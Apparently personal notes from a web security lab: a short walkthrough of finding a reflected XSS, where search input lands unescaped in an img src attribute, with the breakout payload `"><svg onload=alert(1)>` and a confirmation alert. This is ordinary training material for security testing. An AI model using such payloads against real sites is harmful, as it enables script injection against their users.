![[Pasted image 20261006062747.png]]

## Steps

**1. Test reflection**
Enter a random string in the search box:
```
zx9k2q7m
```

**2. Inspect the element**
Right-click → Inspect. You'll see:
```html
<img src="zx9k2q7m">
```
→ Input is reflected **inside the `src` attribute**, unescaped.

**3. Craft payload**
Since we're inside a double-quoted attribute, break out with `"` and `>`:
```
"><svg onload=alert(1)>
```
Resulting HTML:
```html
<img src=""><svg onload=alert(1)">
```

**4. Execute**
Search for:
```
"><svg onload=alert(1)>
```
→ **Alert box pops up** ✅ XSS confirmed.

![[Pasted image 20261006063646.png]]

![[Pasted image 20261006063658.png]]